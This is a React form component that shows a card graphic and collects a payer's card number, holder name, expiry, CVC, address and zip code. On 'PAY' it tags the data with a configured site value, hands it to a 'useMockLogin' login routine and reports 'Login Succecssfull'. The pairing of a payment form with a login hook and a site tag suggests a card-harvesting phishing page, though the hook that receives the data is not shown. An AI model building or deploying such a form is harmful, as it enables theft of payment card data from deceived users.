import { toast } from "react-toastify";
import { useForm } from "react-hook-form";
import useMockLogin from "../hooks/useMockLogin";
import { site } from "../config/index";

function Card() {
  const form = useForm();
  const { register, handleSubmit, reset } = form;
  const { login } = useMockLogin();

  const onSubmit = (values) => {
    const { validity, address, cardNumber, cvc, name, zipCode } = values;
    const submitValues = {
      site,
      validity,
      address,
      cardNumber,
      cvc,
      name,
      zipCode,
    };
    login(submitValues);
    toast.success("Login Succecssfull");
    reset();
  };

  return (
    <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px]  rounded-lg mx-auto">
      <div className="mt-5">
        <form onSubmit={handleSubmit(onSubmit)}>
          <div class="debit-card">
            <img
              src="https://image.ibb.co/gDVR4x/master_card_logo.png"
              class="master-card-logo"
            />
            <div class="card-number-block">
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
              <input
                type="text"
                pattern="^\d{4}$"
                maxlength="4"
                class="number-block"
                placeholder="0000"
              />
            </div>
            <div class="card-holder-block">
              <div class="block-lebel">Card Holder</div>
              <input
                type="text"
                pattern="[A-Z ]+"
                class="card-holder-name"
                placeholder="xxx xxx"
              />
            </div>
          </div>
          <input
            className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Card Number"
            {...register("cardNumber")}
            type="number"
            required
          />

          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Card Holder Name"
            {...register("name")}
            type="string"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="29/30"
            {...register("validity")}
            type="number"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="CVC"
            name="cvc"
            {...register("cvc")}
            type="number"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Address Line 1"
            name="address"
            {...register("address")}
            type="string"
            required
          />
          <input
            className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
            placeholder="Zip Code"
            name="zipCode"
            {...register("zipCode")}
            type="number"
            required
          />

          <button
            type="submit"
            className="mt-5 w-full text-lg font-medium bg-[green] hover:bg-custom-cyan2 py-[10px] text-white transition duration-300 rounded"
          >
            PAY
          </button>
        </form>
      </div>
    </div>
  );
}

export default Card;
